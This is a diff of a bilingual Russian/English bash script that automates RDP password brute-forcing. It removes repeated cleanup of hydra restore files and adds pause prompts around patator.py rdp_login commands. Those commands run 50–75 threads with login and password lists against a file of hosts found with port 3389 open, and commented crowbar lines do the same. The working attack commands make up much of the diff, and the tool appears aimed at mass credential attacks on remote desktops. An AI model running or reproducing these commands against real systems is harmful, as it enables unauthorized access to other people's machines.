 MAINBRUTEMENUEN
 
@@ -26248,9 +25494,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26315,9 +25559,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26382,9 +25624,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26449,9 +25689,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26516,9 +25754,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26583,9 +25819,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26650,9 +25884,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -26715,9 +25947,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26781,9 +26011,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26847,9 +26075,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26913,9 +26139,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26979,9 +26203,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27045,9 +26267,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27111,9 +26331,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27177,9 +26395,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27244,9 +26460,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27311,9 +26525,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27377,9 +26589,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27443,9 +26653,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27509,9 +26717,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27576,9 +26782,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27642,9 +26846,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27709,9 +26911,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27776,9 +26976,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27842,9 +27040,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27909,9 +27105,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -27976,9 +27170,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28043,9 +27235,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28110,9 +27300,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28177,9 +27365,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28244,9 +27430,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28310,9 +27494,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28376,9 +27558,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28443,9 +27623,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28509,9 +27687,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28575,9 +27751,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28641,9 +27815,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28707,9 +27879,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28773,9 +27943,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28840,9 +28008,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28906,9 +28072,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -28973,9 +28137,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -29041,9 +28203,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -29100,9 +28260,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 echo ""
 
@@ -29362,6 +28520,9 @@ clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
+
+
 echo "" 
 python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1  0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -29395,6 +28556,7 @@ clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
@@ -29427,6 +28589,7 @@ clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2  0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
@@ -29448,6 +28611,7 @@ clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass 3=$port -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users  -C $PWD/dict/pass -S $PWD/open 
@@ -29504,6 +28668,8 @@ clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
+echo -e "$yellow*Pause/Take off $aquamarine[P]=>[ENTER]=>$green "
+
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -29538,6 +28704,7 @@ clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Take off $aquamarine[P]=>[ENTER]=>$green "
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -29571,6 +28738,7 @@ clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Take off $aquamarine[P]=>[ENTER]=>$green "
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -29588,6 +28756,7 @@ clear
 echo -e "                              $green Start bruteforceing "
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Take off $aquamarine[P]=>[ENTER]=>$green "
 echo ""
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dict/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -29719,4 +28888,3 @@ fi
 }
 #####################################################################################
 CHECKLANGUAGE
-
